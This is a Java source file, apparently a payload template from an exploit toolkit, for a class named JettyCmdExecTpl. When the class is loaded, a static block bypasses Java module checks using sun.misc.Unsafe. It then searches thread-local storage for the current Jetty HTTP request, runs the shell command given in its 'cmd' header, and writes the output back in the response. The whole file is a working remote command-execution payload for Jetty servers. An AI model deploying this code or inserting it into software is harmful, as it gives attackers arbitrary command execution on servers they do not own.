package jeg.core.template.jetty;

import sun.misc.Unsafe;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class JettyCmdExecTpl {
    static {
        try {
            new JettyCmdExecTpl();
        } catch (Exception e) {
        }
    }
    private void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = this.getClass();
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Throwable e) {

        }
    }

    private String getReqHeaderName() {
        return "cmd";
    }


    public JettyCmdExecTpl() throws NoSuchFieldException, IllegalAccessException {
        addModule();
        run();
    }


    private void run() throws NoSuchFieldException, IllegalAccessException {
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        Thread[] threads = (Thread[]) f.get(group);
        thread : for (Thread thread: threads) {
            try{
                Field threadLocalsField = thread.getClass().getDeclaredField("threadLocals");
                threadLocalsField.setAccessible(true);
                Object threadLocals = threadLocalsField.get(thread);
                if (threadLocals == null){
                    continue;
                }
                Field tableField = threadLocals.getClass().getDeclaredField("table");
                tableField.setAccessible(true);
                Object tableValue = tableField.get(threadLocals);
                if (tableValue == null){
                    continue;
                }
                Object[] tables =  (Object[])tableValue;
                for (Object table:tables) {
                    if (table == null){
                        continue;
                    }
                    Field valueField = table.getClass().getDeclaredField("value");
                    valueField.setAccessible(true);
                    Object value = valueField.get(table);
                    if (value == null){
                        continue;
                    }
                    System.out.println(value.getClass().getName());
                    if(value.getClass().getName().endsWith("AsyncHttpConnection")){
                        Method method = value.getClass().getMethod("getRequest", null);
                        value = method.invoke(value, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{getReqHeaderName()});
                        String result = "\n"+exec(cmd);
                        method = value.getClass().getMethod("getPrintWriter", new Class[]{String.class});
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, new Object[]{"utf-8"});
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if(value.getClass().getName().endsWith("HttpConnection")){
                        Method method = value.getClass().getDeclaredMethod("getHttpChannel", null);
                        Object httpChannel = method.invoke(value, null);
                        method = httpChannel.getClass().getMethod("getRequest", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getHeader", new Class[]{String.class});
                        String cmd = (String)method.invoke(value, new Object[]{getReqHeaderName()});
                        String result = "\n"+exec(cmd);
                        method = httpChannel.getClass().getMethod("getResponse", null);
                        value = method.invoke(httpChannel, null);
                        method = value.getClass().getMethod("getWriter", null);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(value, null);
                        printWriter.println(result);
                        printWriter.flush();
                        break thread;
                    }else if (value.getClass().getName().endsWith("Channel")){
                        Field underlyingOutputField = value.getClass().getDeclaredField("underlyingOutput");
                        underlyingOutputField.setAccessible(true);
                        Object underlyingOutput = underlyingOutputField.get(value);
                        Object httpConnection;
                        try{
                            Field _channelField = underlyingOutput.getClass().getDeclaredField("_channel");
                            _channelField.setAccessible(true);
                            httpConnection = _channelField.get(underlyingOutput);
                        }catch (Exception e){
                            Field connectionField = underlyingOutput.getClass().getDeclaredField("this$0");
                            connectionField.setAccessible(true);
                            httpConnection = connectionField.get(underlyingOutput);
                        }
                        Object request = httpConnection.getClass().getMethod("getRequest").invoke(httpConnection);
                        Object response = httpConnection.getClass().getMethod("getResponse").invoke(httpConnection);
                        String cmd = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, getReqHeaderName());
                        OutputStream outputStream = (OutputStream)response.getClass().getMethod("getOutputStream").invoke(response);
                        String result = "\n"+exec(cmd);
                        outputStream.write(result.getBytes());
                        outputStream.flush();
                        break thread;
                    }
                }
            } catch (Exception e){}
        }
    }

    private String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
